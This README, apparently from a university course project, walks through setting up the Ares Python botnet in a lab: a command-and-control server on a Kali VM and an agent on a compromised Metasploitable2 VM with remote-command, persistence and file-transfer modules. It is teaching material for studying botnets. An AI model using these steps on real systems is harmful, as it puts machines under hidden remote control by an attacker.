# 460 Semester Project - Botnet attacks, Mitigation and Analysis

Project files for 460 SP

## Ares Botnet setup
To set up the Ares botnet, do the following:

### Server VM - Kali Linux or Ubuntu Server 16.04
* Make sure *sqlite3* is installed - *sudo apt-get install sqlite3*
  * Also make sure Python >=2.6 is installed
* Download the Ares botnet code - *wget https://github.com/sweetsoftware/Ares/archive/master.zip*
* Unzip the downloaded archive
* Navigate to *Ares/server/conf* and modify the *server.conf* file.
    * Change the line *server.socket_host: '127.0.0.1'* to *server.socket_host: '0.0.0.0'*
* Execute *python db_init.py* in *Ares/server/* to create and initialize the SQLite3 database.
* Finally, start the server - *python server.py*
* Navigate to the IP address of the server VM at port 8080 to access the Ares command interface.  Enter a database password when prompted and login.

### Client -- Metasploitable2 VM
* Using Kali Linux, exploit a vulnerability and obtain a root shell
* Set up the Metasploitable2 VM

  #### Edit the sources file to allow program downloads and updates:
  * *sudo mv /etc/apt/sources.list /etc/apt/sources.list.mv*
  * *sudo nano /etc/apt/sources.list* and add:
    * deb http://old-releases.ubuntu.com/ubuntu/ hardy main restricted universe multiverse
    * deb http://old-releases.ubuntu.com/ubuntu/ hardy-updates main restricted universe multiverse
    * deb http://old-releases.ubuntu.com/ubuntu/ hardy-security main restricted universe multiverse
    * deb http://ppa.launchpad.net/python-dev/ppa/ubuntu hardy main

  #### Fix error about keyserver
  * Issue *sudo apt-get update*.  If there is an error about keys, do:
    * *sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys (the key code in the response showing the problem)*
  * Finally, update using *sudo apt-get update*

  #### Install Python 2.6, pip and python-requests
  * Install Python 2.6 - *sudo apt-get install python2.6*
  * Install pip - *sudo apt-get install python-pip*
  * Install requests - *sudo pip install requests*

  #### Join the botnet
  * Download the botnet files - *wget https://github.com/sweetsoftware/Ares/archive/master.zip*
  * Extract the archive and navigate to Ares/agent/python
  * Modify two files:
    * settings.py --- change 'localhost' to the IP of the C&C server (Kali VM)
    * agent.py --- comment out/modify the following lines:
      * *from modules import screenshot*
      * Change the line *MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']* to *MODULES = ['runcmd', 'persistence', 'download', 'upload']*
      (that is, remove 'screenshot' from the end of the array list.)
  * Note to self: add a step here to step python 2.6 as default
  * Finally, join the botnet by executing *python2.6 server.py*




<!-- ## Update 11/29/2016
* Added files for Ares Python Botnet

## Setting up the server
* chmod +x and use sudo ./setup.sh to run the setup script
* Automatically downloads all necessary packages, modifies file with IP address
of the C&C server and starts the C&C @ port 8080

## Setting up the bots
* setup.sh handles setting the IP address of the C&C server for the bot
* Simply execute python agent.py within the Ares/agent/python/ directory -->
